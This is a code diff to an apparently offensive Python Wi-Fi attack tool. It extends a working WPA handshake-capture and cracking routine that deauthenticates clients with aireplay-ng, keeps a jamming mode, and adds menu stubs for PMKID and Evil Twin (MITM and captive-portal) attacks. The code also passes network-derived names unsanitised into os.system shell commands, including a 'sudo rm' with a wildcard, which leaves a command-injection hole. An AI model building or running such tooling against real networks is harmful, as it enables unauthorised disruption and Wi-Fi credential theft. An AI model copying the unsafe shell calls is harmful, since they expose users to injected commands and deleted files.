@@ -36,9 +36,10 @@ LOGO = r"""
 # | GLOBAL VARIABLES | #
 
 interfering_services = ['NetworkManager', 'wpa_supplicant', 'avahi-daemon']
-attack_list = ['Handshake Crack', 'WPS Crack', 'Jamming']
+attack_list = ['Handshake Crack', 'PMKID Attack', 'Jamming', 'Evil Twin']
 deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
 jammer_modes = ['Client jamming', 'Broadcast jamming']
+twin_modes = ['MITM/Sniffer', 'Captive_portal']
 
 wifi_networks = []
 interface = None
@@ -46,7 +47,9 @@ target_ap = None
 attack = None
 attack_mode = None
 sniffed_clients = []
-output_file = None
+delete_capture = False
+output_dir = None
+output_file= None
 
 # Get the full path of wifighter dir
 wifighter_path = os.path.dirname(os.path.abspath(__file__))
@@ -83,7 +86,7 @@ def create_cap_dir(target, output_dir):
      if target:
           if not os.path.exists(output_dir):
                print(f"{CYAN}[>]{RESET} Creating capture directory -> WiFighter/attacks/{target.replace(' ', '_')}")
-               os.system(f'mkdir {output_dir}')
+               os.system(f'mkdir -p {output_dir}')
 
 def create_dir(path):
      if not os.path.exists(path):
@@ -193,7 +196,7 @@ def monitor_switch(verbose, command, interface, channel):
                          print(f"{CYAN}Setting {interface} to listen on channel {channel}...{RESET}")
                     result = subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], capture_output=True, text=True)
                     if result.returncode != 0:  # Check if set channel returned error
-                         print(f"\n\n{RED}Setting network card to channel {channel} returned error!{RESET}")
+                         print(f'{RED}Setting network card to channel "{channel}" returned error -> check prompted channel number!{RESET}')
 
           elif command == "start":
                if verbose:
@@ -368,6 +371,34 @@ def choose_jammer_mode():
                if 0 <= choice < len(jammer_modes):
                     jammer_mode = jammer_modes[choice]
                     return jammer_mode # Return chosen deauth mode
+               else:
+                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+     except KeyboardInterrupt:
+          pass
+
+def choose_twin_mode():
+     global twin_modes
+     
+     print(f'{CYAN}| Select Evil Twin Mode |{RESET}\n')
+
+     idx = 1
+     # Show attack modes
+     for twin_mode in twin_modes:
+          print(f"{idx}. {twin_mode}")
+          idx += 1
+     try:
+          while True:     
+               try:
+                    # Prompt the user to choose an deauth mode by number
+                    choice = int(input(f"\nMode number: ")) - 1
+               except ValueError:
+                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+                    continue
+
+               # Check if the choice is in range
+               if 0 <= choice < len(twin_modes):
+                    twin_mode = twin_modes[choice]
+                    return twin_mode # Return chosen deauth mode
                else:
                     print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
      except KeyboardInterrupt:
@@ -651,7 +682,7 @@ def choose_target_client(sniffed_clients):
 # | Handshake Crack | #
 
 def handshake_crack(target_ap, interface, deauth_mode, target):
-     global sniffed_clients, wifighter_path
+     global sniffed_clients, wifighter_path, output_dir, output_file, delete_capture
 
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
@@ -661,6 +692,9 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      target_client = None
      wordlist = None
      password = None
+
+     # Define output dir for handshakes
+     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"
 
      # Set deauth client if attack mode "Client deauth"
      if deauth_mode == 'client deauth':
@@ -680,9 +714,6 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                     target_client = choose_target_client(sniffed_clients)
                except:
                     pass
-
-     # Define output dir for handshakes
-     output_dir = f"{wifighter_path}/attacks/{target.replace(' ', '_')}"
 
      # Determine handshake capture file
      def list_files(directory): 
@@ -766,6 +797,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
      # Listen for handshake
      capture_handshake.start() # Start airodump-ng process
+     delete_capture = True
      time.sleep(2)
 
      # Deauth client/s if selected
@@ -798,7 +830,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                end_time = time.time() # End deauth timer
                elapsed_time = end_time - start_time
                elapsed_time = int(elapsed_time) # Get elapsed time before last deauth
-               if elapsed_time >= 20:
+               if elapsed_time >= 25: # Set time period
                     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target_client, deauth_mode))
                     deauth_clients.start() # Start aireplay-ng process
                     deauth_clients.join() # Wait for the process to stop
@@ -806,6 +838,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 
           time.sleep(1)
 
+     delete_capture = False
      kill_airodump_processes() # Kill all airodump-ng processes
 
      try:
@@ -836,6 +869,12 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      if not password or not wordlist:
           print(f"\n{CYAN}[>]{RESET} Password not found...")
           print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
+
+
+
+# | PMKID ATTACK | #
+def pmkid_attack(target_ap, interface):
+     print('PMKID ATTACK...')
 
 
 
@@ -911,6 +950,13 @@ def jam_network(target_ap, interface, jammer_mode):
      # Run aireplay-ng
      deauth_clients.start()
      deauth_clients.join()
+
+
+
+# | Evil Twin | #
+def evil_twin(target_ap, interface, twin_mode):
+     print(f'EVIL TWIN ATTACK... MODE: {twin_mode}')
+
 
 #------------------------------------------------------------------------------------
 
@@ -1007,10 +1053,15 @@ else:
                     try:
                          handshake_crack(target_ap, interface, deauth_mode, target) # Start attack
                     except KeyboardInterrupt:
-                         pass
+                         if output_dir and output_file and delete_capture:
+                              file_keyword = output_file.split('.')[0]
+                              os.system(f'sudo rm {output_dir}/{file_keyword}*') # Delete all cap files created with airodump
 
-          elif attack == 'WPS Crack':
-               print('WPS...')
+          elif attack == 'PMKID Attack':
+               try:
+                    pmkid_attack(target_ap, interface)
+               except:
+                    pass
 
           elif attack == 'Jamming':
                jammer_mode = choose_jammer_mode()
@@ -1019,7 +1070,15 @@ else:
                          jam_network(target_ap, interface, jammer_mode) # Start attack
                     except KeyboardInterrupt:
                          pass
-     
+
+          elif attack == 'Evil Twin':
+               twin_mode = choose_twin_mode()
+               if twin_mode:
+                    try:
+                         evil_twin(target_ap, interface, twin_mode)
+                    except KeyboardInterrupt:
+                         pass
+
 
      # On tool end turn everything back on
      print(f"\n\n{BLUE}Exiting the tool...{RESET}")
@@ -1028,3 +1087,4 @@ else:
                monitor_switch(None, 'stop', interface, None)
           except:
                pass
+     
